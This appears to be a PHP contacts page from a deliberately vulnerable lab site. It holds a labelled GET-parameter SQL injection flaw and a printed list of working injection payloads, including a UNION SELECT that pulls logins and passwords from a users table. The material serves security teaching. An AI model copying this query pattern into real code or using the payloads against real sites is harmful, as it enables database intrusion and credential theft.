<?php require_once "lib/config.php"; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="<?php echo BASE_PATH; ?>/style.css">
    <title>Contacts</title>
</head>
<body>
    <?php require_once "blocks/header.php"; ?>

    <div class="container hero_contacts">
        <h1>Lorem Ipsum is simply dummy text of the printing and.</h1>
        <p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. </p>
        <img src="<?php echo BASE_PATH; ?>/imgs/blocks/Huge Global.png" alt="">
    </div>

    <?php if(isset($_GET['success'])): ?>
        <div class="container" style="background: green; color: white; padding: 15px; margin: 20px auto; border-radius: 5px;">
            <p>Message sent successfully!</p>
        </div>
    <?php endif; ?>

    <!-- VULNERABLE: GET-based SQL Injection - Results output to console -->
    <?php if(isset($_GET['id'])): ?>
        <?php
        require_once "lib/db.php";
        
        // VULNERABLE: Direct string concatenation with GET parameter - SQL INJECTION RISK!
        $id = $_GET['id'];
        $sql = "SELECT * FROM contacts WHERE id = $id";
        
        try {
            $query = $pdo->query($sql);
            $results = $query->fetchAll(PDO::FETCH_OBJ);
            
            // Convert results to JSON for console output
            $resultsJson = json_encode($results, JSON_PRETTY_PRINT);
            $sqlQuery = htmlspecialchars($sql);
            $rowCount = count($results);
            
            // Output to console using JavaScript
            echo "<script>";
            echo "console.log('%c SQL INJECTION VULNERABILITY EXPLOITED ', 'color: #ff6b6b; font-size: 20px; font-weight: bold;');";
            echo "console.log('%cSQL Query Executed:', 'color: #4ecdc4; font-size: 16px; font-weight: bold;');";
            echo "console.log('%c" . addslashes($sqlQuery) . "', 'color: #0f0; font-size: 14px; background: #000; padding: 5px;');";
            echo "console.log('%cResults: " . $rowCount . " row(s) retrieved', 'color: #4ecdc4; font-size: 16px; font-weight: bold;');";
            echo "console.log('Data extracted:', " . $resultsJson . ");";
            
            if($rowCount > 0) {
                echo "console.table(" . $resultsJson . ");";
                echo "console.log('%c VULNERABILITY CONFIRMED - Data successfully extracted from database!', 'color: #ff6b6b; font-size: 14px; font-weight: bold; background: #1a1a1a; padding: 10px;');";
            } else {
                echo "console.log('%c No results found for ID: " . htmlspecialchars($id) . "', 'color: #ff6b6b; font-size: 14px;');";
            }
            echo "</script>";
            
            // Simple message on page
            echo "<div class='container' style='margin: 20px auto; padding: 20px; background: #fff3cd; border: 2px solid #ffc107; border-radius: 5px; text-align: center;'>";
            echo "<p style='color: #856404; font-size: 16px; margin: 0;'><strong> SQL Injection Detected!</strong></p>";
            echo "<p style='color: #856404; font-size: 14px; margin: 10px 0 0 0;'>Check the browser console (F12) to see the extracted data.</p>";
            echo "</div>";
            
        } catch(PDOException $e) {
            // Output error to console
            echo "<script>";
            echo "console.error('%c DATABASE ERROR ', 'color: #ff6b6b; font-size: 18px; font-weight: bold;');";
            echo "console.error('SQL Query: " . addslashes($sqlQuery) . "');";
            echo "console.error('Error: " . addslashes($e->getMessage()) . "');";
            echo "console.warn('This error might reveal database structure information!');";
            echo "</script>";
            
            echo "<div class='container' style='margin: 20px auto; padding: 20px; background: #f8d7da; border: 2px solid #dc3545; border-radius: 5px; text-align: center;'>";
            echo "<p style='color: #721c24; font-size: 16px; margin: 0;'><strong> Database Error</strong></p>";
            echo "<p style='color: #721c24; font-size: 14px; margin: 10px 0 0 0;'>Check the browser console (F12) for details.</p>";
            echo "</div>";
        }
        ?>
    <?php endif; ?>

    <div class="feedback"> 
        <div class="container">
            <h2>Say hello</h2>
            <p>Lorem Ipsum is simply dummy text of the printing .</p>

            <form method="post" action="<?php echo BASE_PATH; ?>/lib/contact.php">
                <div class="inline">
                    <div>
                        <label>First Name</label>
                        <input type="text" name="first_name" required>
                    </div>
                    <div>
                        <label>Last Name</label>
                        <input type="text" name="last_name" required>
                    </div>
                </div>
                
                <label>Email Address</label>
                <input class="one_line" type="email" name="email" required>
                
                <label>Message</label>
                <textarea class="one_line" name="message" required></textarea>
                
                <button type="submit">Get in touch</button>
            </form>
            
            <hr style="margin: 30px 0;">
            <div style="background: #1a1a1a !important; padding: 25px !important; border: 3px solid #ff6b6b !important; border-radius: 10px !important; box-shadow: 0 4px 8px rgba(0,0,0,0.3) !important;">
                <h3 style="color: #ff6b6b !important; font-size: 24px !important; margin-bottom: 20px !important; text-align: center !important; border-bottom: 2px solid #ff6b6b !important; padding-bottom: 10px !important;">[WARNING] SQL Injection Test (GET-based)</h3>
                <p style="color: #fff !important; font-size: 16px !important; margin: 15px 0 !important;"><strong style="color: #4ecdc4 !important;">Normal access:</strong> <a href="<?php echo BASE_PATH; ?>/contacts.php?id=1" style="color: #4ecdc4 !important; text-decoration: underline !important;">contacts.php?id=1</a></p>
                
                <h4 style="color: #4ecdc4 !important; font-size: 20px !important; margin: 20px 0 15px 0 !important;">Attack Examples:</h4>
                <ol style="color: #fff !important; font-size: 16px !important; line-height: 1.8 !important;">
                    <li style="margin: 15px 0 !important;"><strong style="color: #4ecdc4 !important;">Get all contacts:</strong><br>
                        <code style="background: #000 !important; color: #0f0 !important; padding: 8px 12px !important; border-radius: 5px !important; font-size: 14px !important; display: inline-block !important; margin-top: 5px !important; border: 1px solid #4ecdc4 !important;"><?php echo BASE_PATH; ?>/contacts.php?id=1 OR 1=1</code>
                    </li>
                    <li style="margin: 15px 0 !important;"><strong style="color: #4ecdc4 !important;">Extract users table:</strong><br>
                        <code style="background: #000 !important; color: #0f0 !important; padding: 8px 12px !important; border-radius: 5px !important; font-size: 12px !important; display: inline-block !important; margin-top: 5px !important; border: 1px solid #4ecdc4 !important; word-break: break-all !important;"><?php echo BASE_PATH; ?>/contacts.php?id=-1 UNION SELECT id,login,username,email,password,created_at FROM users</code>
                    </li>
                    <li style="margin: 15px 0 !important;"><strong style="color: #4ecdc4 !important;">Get database name:</strong><br>
                        <code style="background: #000 !important; color: #0f0 !important; padding: 8px 12px !important; border-radius: 5px !important; font-size: 14px !important; display: inline-block !important; margin-top: 5px !important; border: 1px solid #4ecdc4 !important;"><?php echo BASE_PATH; ?>/contacts.php?id=-1 UNION SELECT 1,database(),3,4,5,6</code>
                    </li>
                    <li style="margin: 15px 0 !important;"><strong style="color: #4ecdc4 !important;">List all tables:</strong><br>
                        <code style="background: #000 !important; color: #0f0 !important; padding: 8px 12px !important; border-radius: 5px !important; font-size: 12px !important; display: inline-block !important; margin-top: 5px !important; border: 1px solid #4ecdc4 !important; word-break: break-all !important;"><?php echo BASE_PATH; ?>/contacts.php?id=-1 UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()</code>
                    </li>
                </ol>
            </div>
        </div>
    </div>

    <?php require_once "blocks/footer.php"; ?>
</body>
</html>